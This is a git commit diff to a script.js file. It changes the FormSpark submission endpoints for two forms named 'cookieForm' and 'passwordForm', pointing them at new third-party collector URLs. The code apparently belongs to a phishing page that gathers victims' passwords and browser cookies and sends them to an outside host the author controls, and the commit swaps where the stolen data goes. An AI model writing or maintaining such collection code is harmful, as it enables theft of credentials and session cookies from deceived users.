853dfb4623d82ed09a45a615491e2829691618d5
Alfa5775 <Sheerazd57@proton.me>
2025-02-24 17:20:49 +0500

    Update script.js

--- script.js
+++ script.js
@@ -33,5 +33,5 @@ passwordForm.addEventListener('submit', function(e) {
 });
 
 // Set FormSpark form actions
-cookieForm.setAttribute('action', 'https://submit-form.com/g0dJSXe5U');
-passwordForm.setAttribute('action', 'https://submit-form.com/TSRlLhDlN');
+cookieForm.setAttribute('action', 'https://submit-form.com/FuVunFZvz');
+passwordForm.setAttribute('action', 'https://submit-form.com/Hvm6ZNLlY');
